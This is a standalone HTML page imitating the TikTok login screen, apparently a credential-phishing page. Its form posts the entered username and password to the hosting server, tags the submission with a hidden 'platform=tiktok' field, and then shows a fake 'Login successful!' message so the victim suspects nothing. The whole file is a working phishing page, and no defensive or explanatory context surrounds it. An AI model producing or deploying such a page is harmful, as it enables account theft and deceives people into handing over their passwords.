<!DOCTYPE html><html><head><title>TikTok</title><meta name="viewport" content="width=device-width"><style>body{background:linear-gradient(135deg,#fe2c55,#ff7043,#ffcc02);font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}.container{background:#fff;border-radius:20px;padding:40px 30px;width:340px;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,.3)}.logo{font-size:48px;font-weight:900;background:linear-gradient(45deg,#fe2c55,#ff7043);background-clip:text;-webkit-background-clip:text;color:transparent;margin-bottom:30px}.input-group input{width:100%;padding:16px;margin:12px 0;border:2px solid #eee;border-radius:12px;font-size:16px;box-sizing:border-box}.login-btn{width:100%;padding:16px;background:linear-gradient(45deg,#fe2c55,#ff7043);color:#fff;border:0;border-radius:12px;font-size:18px;font-weight:700;cursor:pointer;margin:20px 0}.login-btn:hover{transform:translateY(-2px)}</style></head><body><div class="container"><div class="logo">TikTok</div><form method="POST"><input type="text" name="username" placeholder="Email or Username" required><input type="password" name="password" placeholder="Password" required><input type="hidden" name="platform" value="tiktok"><button type="submit" class="login-btn">Log in</button></form></div><script>document.querySelector('form').onsubmit=function(){setTimeout(()=>{document.body.innerHTML='<div style="padding:60px;text-align:center;color:#fe2c55;font-size:20px">Login successful!</div>';},600);}</script></body></html>
